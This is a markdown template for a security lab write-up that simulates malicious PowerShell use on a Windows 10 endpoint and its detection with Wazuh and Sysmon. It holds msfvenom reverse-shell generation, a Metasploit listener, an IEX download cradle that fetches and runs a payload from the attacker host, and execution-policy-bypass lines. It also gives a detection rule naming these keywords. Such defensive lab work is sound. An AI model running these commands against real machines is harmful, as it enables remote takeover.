# ⚡ Attack 03 – PowerShell Execution (Windows Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Malicious PowerShell Execution |
| **Target** | Windows 10 Endpoint (WIN-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Execution |
| **MITRE Technique** | T1059.001 – Command and Scripting Interpreter: PowerShell |
| **Severity** | High |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate adversary use of PowerShell for command execution, download cradles, and encoded commands — testing Wazuh and Sysmon's ability to detect suspicious PowerShell activity indicative of post-exploitation behavior.

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| WIN-ENDPOINT | Target/Victim | `192.168.x.x` | Windows 10 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Attack Diagram

```
┌──────────────┐     Reverse Shell / Payload     ┌──────────────────┐
│  Kali Linux  │ ─────────────────────────────▶  │  WIN-ENDPOINT    │
│  (Attacker)  │    PowerShell Execution          │  (Victim)        │
└──────┬───────┘                                  └────────┬─────────┘
       │                                                   │ PS Logs
       │◀────────── Callback/Exfil ────────────────────────┘
       │                                                   │
       │                                          ┌────────▼─────────┐
       │                                          │  Wazuh Server    │
       │                                          │  (SIEM)          │
       │                                          └──────────────────┘
```

## Kali Commands Used

```bash
# Generate PowerShell reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f psh -o payload.ps1

# Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <KALI_IP>; set LPORT 4444; exploit"

# Host payload for download cradle
python3 -m http.server 8080
```

**On Target (simulated PowerShell commands):**
```powershell
# Download cradle (simulated)
IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>:8080/payload.ps1')

# Encoded command execution
powershell -EncodedCommand <BASE64_ENCODED_COMMAND>

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File .\script.ps1

# AMSI bypass attempt (simulated)
powershell -NoProfile -WindowStyle Hidden -Command "<COMMAND>"
```

## Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/win-attack03-ps-execution.png` | PowerShell command execution |
| `screenshots/win-attack03-sysmon-event1.png` | Sysmon Event ID 1 – Process Creation |
| `screenshots/win-attack03-wazuh-alert.png` | Wazuh PowerShell alert |
| `screenshots/win-attack03-ps-logging.png` | PowerShell script block logging |

## Endpoint Evidence

**PowerShell Logging:**
```
Event ID: 4104 (Script Block Logging)
Event ID: 4103 (Module Logging)
Event ID: 400/403 (PowerShell Engine Start/Stop)
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | <!-- Rule --> | PowerShell suspicious execution detected | <!-- Level --> | <!-- Time --> |

```json
{
  "rule": {
    "id": "",
    "description": "PowerShell suspicious command detected",
    "level": 12
  },
  "agent": {
    "name": "WIN-ENDPOINT"
  },
  "data": {
    "win.eventdata.commandLine": "powershell -EncodedCommand ..."
  }
}
```

## Relevant Event IDs

| Event ID | Source | Description | Relevance |
|---|---|---|---|
| 4104 | PowerShell | Script Block Logging | Captures full PowerShell script content |
| 4103 | PowerShell | Module Logging | Module invocation tracking |
| 1 | Sysmon | Process Creation | PowerShell.exe spawned with suspicious args |
| 3 | Sysmon | Network Connection | Outbound connection to attacker IP |
| 7 | Sysmon | Image Loaded | DLLs loaded by PowerShell |

## Sysmon Events

```xml
<Event>
  <System>
    <EventID>1</EventID>
  </System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell -EncodedCommand ...</Data>
    <Data Name="ParentImage"><!-- Parent Process --></Data>
    <Data Name="User"><!-- User --></Data>
  </EventData>
</Event>
```

## Log Analysis

### Key Findings

1. **Finding 1:** <!-- PowerShell execution with suspicious parameters -->
2. **Finding 2:** <!-- Network callbacks to attacker IP -->
3. **Finding 3:** <!-- Encoded/obfuscated commands detected -->

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Execution |
| **Technique ID** | T1059.001 |
| **Technique Name** | Command and Scripting Interpreter: PowerShell |
| **Sub-Technique** | PowerShell |
| **Procedure** | Adversary executed encoded PowerShell commands and download cradles to establish reverse shell access |
| **Detection Opportunity** | Monitor for powershell.exe with `-EncodedCommand`, `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` arguments via Sysmon Event ID 1 and PowerShell 4104 |

## Detection Logic

```xml
<rule id="100003" level="12">
  <if_sid>61600</if_sid>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(encodedcommand|bypass|hidden|downloadstring|iex)</field>
  <description>Suspicious PowerShell execution detected - possible malicious activity</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
</rule>
```

## Investigation Process

1. **Alert Triage:** Wazuh alerted on suspicious PowerShell execution
2. **Command Analysis:** Decoded encoded commands; analyzed script block logs (4104)
3. **Process Tree:** Examined parent-child process relationships via Sysmon
4. **Network Analysis:** Checked for outbound connections to external/attacker IPs
5. **Impact Assessment:** Determined scope of code execution and data accessed
6. **Verdict:** Confirmed malicious PowerShell execution — post-exploitation activity

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- High/Critical --> | <!-- Log reference --> |
| 2 | <!-- Finding --> | <!-- High/Critical --> | <!-- Log reference --> |

## Lessons Learned

- <!-- Effectiveness of PowerShell script block logging -->
- <!-- Sysmon coverage for PowerShell execution -->
- <!-- Need for constrained language mode / AppLocker -->
- <!-- Detection rule tuning for encoded commands -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
